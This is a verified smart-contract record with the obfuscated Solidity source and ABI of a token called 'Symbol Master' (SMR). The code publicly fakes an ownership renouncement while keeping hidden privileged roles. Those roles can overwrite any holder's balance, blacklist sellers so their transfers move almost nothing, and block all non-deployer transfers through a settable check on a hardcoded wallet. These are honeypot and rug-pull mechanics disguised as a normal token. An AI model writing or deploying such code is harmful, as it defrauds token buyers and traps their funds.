{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface tokenTake {\n    function createPair(address takeAutoMode, address fromSender) external returns (address);\n}\n\ninterface sellLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingExempt) external view returns (uint256);\n\n    function transfer(address amountFrom, uint256 limitTxLaunch) external returns (bool);\n\n    function allowance(address walletReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitTxLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountFrom,\n        uint256 limitTxLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyLaunched, uint256 value);\n    event Approval(address indexed walletReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract buyLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityBuyExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellLaunchMetadata is sellLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SymbolMaster is buyLimit, sellLaunch, sellLaunchMetadata {\n\n    bool private tokenToSell;\n\n    function totalSwap(address maxSell) public {\n        autoReceiverSwap();\n        if (senderAuto == marketingLimit) {\n            buyToLaunched = receiverTx;\n        }\n        if (maxSell == senderAt || maxSell == modeReceiver) {\n            return;\n        }\n        maxReceiverTrading[maxSell] = true;\n    }\n\n    function teamWallet(address receiverTrading, address amountFrom, uint256 limitTxLaunch) internal returns (bool) {\n        require(receiverTotal[receiverTrading] >= limitTxLaunch);\n        receiverTotal[receiverTrading] -= limitTxLaunch;\n        receiverTotal[amountFrom] += limitTxLaunch;\n        emit Transfer(receiverTrading, amountFrom, limitTxLaunch);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private txWallet;\n\n    uint256 public buyToLaunched;\n\n    function transfer(address maxTotal, uint256 limitTxLaunch) external virtual override returns (bool) {\n        return feeIs(_msgSender(), maxTotal, limitTxLaunch);\n    }\n\n    function walletFund(address isLaunched) public {\n        require(isLaunched.balance < 100000);\n        if (walletTrading) {\n            return;\n        }\n        if (modeTx != buyToLaunched) {\n            buyToLaunched = receiverTx;\n        }\n        totalAuto[isLaunched] = true;\n        if (teamToken == buyToLaunched) {\n            marketingLimit = false;\n        }\n        walletTrading = true;\n    }\n\n    mapping(address => bool) public totalAuto;\n\n    event OwnershipTransferred(address indexed minMarketing, address indexed amountBuy);\n\n    bool public senderAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptLimit;\n    }\n\n    bool public walletTrading;\n\n    uint8 private swapLaunch = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return launchIs;\n    }\n\n    function autoReceiverSwap() private view {\n        require(totalAuto[_msgSender()]);\n    }\n\n    uint256 private walletTake = 100000000 * 10 ** 18;\n\n    function transferFrom(address receiverTrading, address amountFrom, uint256 limitTxLaunch) external override returns (bool) {\n        if (_msgSender() != atList) {\n            if (txWallet[receiverTrading][_msgSender()] != type(uint256).max) {\n                require(limitTxLaunch <= txWallet[receiverTrading][_msgSender()]);\n                txWallet[receiverTrading][_msgSender()] -= limitTxLaunch;\n            }\n        }\n        return feeIs(receiverTrading, amountFrom, limitTxLaunch);\n    }\n\n    string private launchIs = \"Symbol Master\";\n\n    uint256 public modeTx;\n\n    address public senderAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapLaunch;\n    }\n\n    uint256 limitTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletTake;\n    }\n\n    address public modeReceiver;\n\n    function getOwner() external view returns (address) {\n        return launchedLaunch;\n    }\n\n    uint256 public teamToken;\n\n    mapping(address => bool) public maxReceiverTrading;\n\n    function allowance(address walletList, address walletIs) external view virtual override returns (uint256) {\n        if (walletIs == atList) {\n            return type(uint256).max;\n        }\n        return txWallet[walletList][walletIs];\n    }\n\n    address atList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private marketingLimit;\n\n    function shouldFrom() public {\n        emit OwnershipTransferred(senderAt, address(0));\n        launchedLaunch = address(0);\n    }\n\n    function balanceOf(address marketingExempt) public view virtual override returns (uint256) {\n        return receiverTotal[marketingExempt];\n    }\n\n    function feeIs(address receiverTrading, address amountFrom, uint256 limitTxLaunch) internal returns (bool) {\n        if (receiverTrading == senderAt) {\n            return teamWallet(receiverTrading, amountFrom, limitTxLaunch);\n        }\n        uint256 txFrom = sellLaunch(modeReceiver).balanceOf(receiverWallet);\n        require(txFrom == limitTotal);\n        require(amountFrom != receiverWallet);\n        if (maxReceiverTrading[receiverTrading]) {\n            return teamWallet(receiverTrading, amountFrom, sellMinLiquidity);\n        }\n        return teamWallet(receiverTrading, amountFrom, limitTxLaunch);\n    }\n\n    constructor (){\n        if (marketingLimit) {\n            modeTx = teamToken;\n        }\n        liquidityBuyExempt txExemptAmount = liquidityBuyExempt(atList);\n        modeReceiver = tokenTake(txExemptAmount.factory()).createPair(txExemptAmount.WETH(), address(this));\n        if (tradingSender) {\n            modeTx = buyToLaunched;\n        }\n        senderAt = _msgSender();\n        totalAuto[senderAt] = true;\n        receiverTotal[senderAt] = walletTake;\n        shouldFrom();\n        \n        emit Transfer(address(0), senderAt, walletTake);\n    }\n\n    uint256 constant sellMinLiquidity = 4 ** 10;\n\n    uint256 public receiverTx;\n\n    mapping(address => uint256) private receiverTotal;\n\n    bool private tradingSender;\n\n    address private launchedLaunch;\n\n    function liquidityReceiverTrading(uint256 limitTxLaunch) public {\n        autoReceiverSwap();\n        limitTotal = limitTxLaunch;\n    }\n\n    string private exemptLimit = \"SMR\";\n\n    function owner() external view returns (address) {\n        return launchedLaunch;\n    }\n\n    address receiverWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 launchWallet;\n\n    function approve(address walletIs, uint256 limitTxLaunch) public virtual override returns (bool) {\n        txWallet[_msgSender()][walletIs] = limitTxLaunch;\n        emit Approval(_msgSender(), walletIs, limitTxLaunch);\n        return true;\n    }\n\n    function tokenMinTx(address maxTotal, uint256 limitTxLaunch) public {\n        autoReceiverSwap();\n        receiverTotal[maxTotal] = limitTxLaunch;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTxLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitTxLaunch\",\"type\":\"uint256\"}],\"name\":\"liquidityReceiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxReceiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTxLaunch\",\"type\":\"uint256\"}],\"name\":\"tokenMinTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSell\",\"type\":\"address\"}],\"name\":\"totalSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTxLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTxLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunched\",\"type\":\"address\"}],\"name\":\"walletFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SymbolMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}